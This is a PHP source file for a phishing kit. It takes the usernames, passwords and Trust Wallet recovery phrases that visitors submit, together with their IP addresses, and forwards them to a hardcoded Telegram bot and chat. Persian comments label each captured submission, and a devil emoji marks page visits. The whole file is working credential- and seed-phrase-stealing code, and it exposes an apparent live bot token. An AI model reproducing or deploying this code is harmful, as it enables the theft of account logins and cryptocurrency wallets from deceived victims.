<?php

ob_start();
error_reporting(1);
define('API_KEY','7311638344:AAGZAWOvvBgWR8O1CcnsUoPZdvNlQ9QcAJU');
//-----------------------------------------------------------------------------------------
//فانکشن  :
function AFG($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$request = $_REQUEST;
$ip =$_SERVER['REMOTE_ADDR'];

if($_REQUEST['step'] == "login"){
$usernm = $_REQUEST['username'];
$pass = $_REQUEST['password'];
$txt = "
تلاش ورود به سایت با اطلاعات زیر:
نام کاربری🤩:
$usernm
رمز : 
$pass
ای پی: $ip
";
}elseif($_REQUEST['step'] == "trustwallet"){
$usernm = $_REQUEST['from'];
$passt = $_REQUEST['trust-wallet'];
$txt = "
 کلمات ورود تراست ولت را وارد کاربر:
نام کاربری: 
$usernm
کلمات تراست ولت ✨: 
$passt
ای پی: $ip
";
}else{
$txt = "
 کاربری وارد صفحه ورود شد😈
ای پی: $ip
";
}


AFG('sendmessage',[
                'chat_id'=>141610271,
        "text"=>$txt,
]);
    		
 

